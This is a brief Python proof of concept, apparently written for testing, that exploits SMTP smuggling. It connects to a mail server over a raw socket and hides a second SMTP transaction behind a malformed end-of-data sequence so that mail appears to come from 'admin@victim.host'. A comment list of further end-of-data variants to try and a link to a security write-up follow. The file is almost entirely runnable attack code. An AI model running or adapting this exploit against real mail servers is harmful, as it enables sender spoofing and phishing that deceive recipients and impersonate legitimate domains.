import socket

smtp_server = "mailserver"
smtp_port = 25

from_email = "from@attacker"
to_email = "to@victim.host"


# Metin sonundaki \ karakteri ek 0a char eklenmesini engellemek için

email_message_2 = """\
From: Attacker\r\n\
To: Victim\r\n\
Subject: First Message\r\n\
First Message\
\r\n.\x00\r\n\
mail from: <admin@victim.host>\r\n\
rcpt to: <to@victim.host>\r\n\
data\r\n\
From: Admin\r\n\
To: Victim\r\n\
Subject: Second Message\r\n\r\n\
Second Message\
\r\n.\r\n\
"""

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((smtp_server, smtp_port))
        response = s.recv(1024)
        s.sendall(b"EHLO domain.com\r\n")
        response = s.recv(1024)
        s.sendall(b"MAIL FROM:<" + from_email.encode() + b">\r\n")
        response = s.recv(1024)
        s.sendall(b"RCPT TO:<" + to_email.encode() + b">\r\n")
        response = s.recv(1024)
        s.sendall(b"DATA\r\n")
        response = s.recv(1024)
        s.sendall(email_message_2.encode())
        response = s.recv(1024)
        print(response.decode())
        s.sendall(b"quit\r\n")
        response = s.recv(1024)
        
        print("Sent.")
except Exception as e:
    print(f"Failed: {str(e)}")


# Test Cases

# \n.\r\n
# \r.\r\n
# \n\n.\r\n
# \r\n.\n
# \r\n.\r
# \r\n\x00.\r\n
# \r\n.\x00\r\n
# \n.\n

# https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/

